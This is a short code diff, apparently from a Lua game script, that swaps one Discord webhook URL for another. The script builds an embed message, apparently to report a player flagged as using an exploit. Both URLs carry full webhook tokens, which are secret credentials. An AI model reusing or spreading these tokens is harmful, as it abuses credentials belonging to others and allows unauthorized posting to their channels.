@@ -15,7 +15,7 @@ else
 	   "Kid with shit exploit"
  
 	local url =
-	   "https://discord.com/api/webhooks/1041782128226082826/QNyeWpfPsroPvJPpqn4A3jJSXMjCmIKqPNILCiQlxAJXUY19ajuH8KikY2dowFfkygVx"
+	   "https://discord.com/api/webhooks/1066077230511427655/tjhr6Fpf0Df5_u7Q2R9vePOkktimBNbL2p_YRhScIWfimbYMazOw2hC2EpBTxc5xAC5Y"
 	local data = {
 	   ["content"] = "",
 	   ["embeds"] = {
